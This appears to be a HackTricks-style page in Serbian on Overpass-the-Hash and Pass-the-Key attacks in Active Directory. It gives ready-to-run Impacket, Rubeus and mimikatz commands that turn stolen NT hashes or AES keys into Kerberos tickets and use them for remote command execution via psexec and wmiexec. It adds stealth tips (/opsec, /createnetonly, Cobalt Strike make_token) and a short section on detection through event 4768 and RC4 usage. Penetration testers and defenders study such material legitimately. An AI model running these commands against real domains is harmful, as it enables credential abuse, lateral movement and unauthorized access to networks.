# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** napad je osmišljen za okruženja u kojima je tradicionalni NTLM protokol ograničen, a Kerberos autentikacija ima prednost. Ovaj napad koristi NTLM hash ili AES ključeve korisnika za dobijanje Kerberos tickets, čime omogućava neovlašćen pristup resursima unutar mreže.

Strogo govoreći:

- **Over-Pass-the-Hash** obično znači pretvaranje **NT hash-a** u Kerberos TGT pomoću **RC4-HMAC** Kerberos ključa.
- **Pass-the-Key** je opštija varijanta, kod koje već imate Kerberos ključ, kao što je **AES128/AES256**, i pomoću njega direktno zahtevate TGT.

Ova razlika je važna u ojačanim okruženjima: ako je **RC4 onemogućen** ili ga KDC više ne podrazumeva, **sam NT hash nije dovoljan** i potreban vam je **AES ključ** (ili password u čistom tekstu iz kog se on može izvesti).

Za izvršavanje ovog napada, početni korak podrazumeva pribavljanje NTLM hash-a ili password-a ciljanog korisničkog naloga. Nakon pribavljanja ovih informacija, moguće je dobiti Ticket Granting Ticket (TGT) za taj nalog, što napadaču omogućava pristup servisima ili mašinama za koje korisnik ima dozvole.

Proces se može pokrenuti sledećim commands:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Za scenarije koji zahtevaju AES256, može se koristiti opcija `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` takođe podržava direktno zahtevanje **service ticket-a putem AS-REQ** pomoću opcije `-service <SPN>`, što može biti korisno kada želite ticket za određeni SPN bez dodatnog TGS-REQ-a:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Štaviše, pribavljeni ticket može se koristiti sa različitim alatima, uključujući `smbexec.py` ili `wmiexec.py`, čime se proširuje obim napada.

Problemi kao što su _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešavaju ažuriranjem biblioteke Impacket ili korišćenjem hostname-a umesto IP adrese, čime se obezbeđuje kompatibilnost sa Kerberos KDC-om.

Alternativna sekvenca komandi koja koristi Rubeus.exe prikazuje još jedan aspekt ove tehnike:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ovaj metod oponaša pristup **Pass the Key**, sa fokusom na preuzimanje kontrole nad ticket-om i njegovo direktno korišćenje u svrhu autentikacije. U praksi:

- `Rubeus asktgt` sam šalje **raw Kerberos AS-REQ/AS-REP** i nisu mu potrebne admin privilegije, osim ako želite da ciljate drugu logon sesiju pomoću `/luid` ili da kreirate zasebnu pomoću `/createnetonly`.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` ubacuje credential materijal u logon sesiju i zbog toga **dodiruje LSASS**, što obično zahteva lokalne admin privilegije ili `SYSTEM` i stvara više buke iz EDR perspektive.

Primeri sa Mimikatz-om:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Da bi se ispoštovala operativna bezbednost i koristio AES256, može se primeniti sledeća komanda:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` je relevantan zato što se saobraćaj koji generiše Rubeus neznatno razlikuje od nativnog Windows Kerberos saobraćaja. Takođe imajte na umu da je `/opsec` namenjen saobraćaju **AES256**; njegova upotreba sa RC4 obično zahteva `/force`, čime se gubi veliki deo svrhe, jer je **RC4 u modernim domenima sam po sebi snažan indikator**.

## Napomene o detekciji

Svaki zahtev za TGT generiše **event `4768`** na DC-u. U aktuelnim Windows verzijama ovaj event sadrži korisnija polja nego što se navodi u starijim tekstovima:

- `TicketEncryptionType` pokazuje koji je enctype korišćen za izdati TGT. Tipične vrednosti su `0x17` za **RC4-HMAC**, `0x11` za **AES128** i `0x12` za **AES256**.<sup>[[3]](#references)</sup>
- Ažurirani eventi takođe izlažu `SessionKeyEncryptionType`, `PreAuthEncryptionType` i enctypes koje je klijent oglasio, što pomaže u razlikovanju **stvarne zavisnosti od RC4** od zbunjujućih podrazumevanih legacy podešavanja.
- Pojavljivanje `0x17` u modernom okruženju dobar je pokazatelj da nalog, host ili KDC fallback putanja i dalje dozvoljavaju RC4 i da su zato pogodniji za Over-Pass-the-Hash zasnovan na NT hash-u.

Microsoft postepeno smanjuje ponašanje sa RC4 kao podrazumevanom vrednošću još od Kerberos hardening ažuriranja iz novembra 2022, a trenutno objavljene smernice preporučuju da se **RC4 ukloni kao podrazumevani pretpostavljeni enctype za AD DC-ove do kraja Q2 2026.** Iz ofanzivne perspektive, to znači da je **Pass-the-Key sa AES-om** sve pouzdanija putanja, dok će klasični **OpTH koji koristi samo NT hash** sve češće otkazivati u hardenovanim okruženjima.<sup>[[3]](#references)</sup>

Za više detalja o Kerberos encryption type-ovima i povezanim ticketing ponašanjima pogledajte:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Diskretnija verzija

> [!WARNING]
> Svaka logon sesija može imati samo jedan aktivni TGT u datom trenutku, zato budite pažljivi.

1. Kreirajte novu logon sesiju pomoću **`make_token`** iz Cobalt Strike-a.
2. Zatim koristite Rubeus da generišete TGT za novu logon sesiju, bez uticaja na postojeću sesiju.

Sličnu izolaciju možete postići i direktno iz Rubeus-a pomoću žrtvene sesije **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Ovo sprečava prepisivanje trenutnog session TGT-a i obično je bezbednije od uvoza ticket-a u postojeći logon session.

## Reference

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repozitorijum)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detektovanje i otklanjanje RC4 upotrebe u Kerberos-u](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
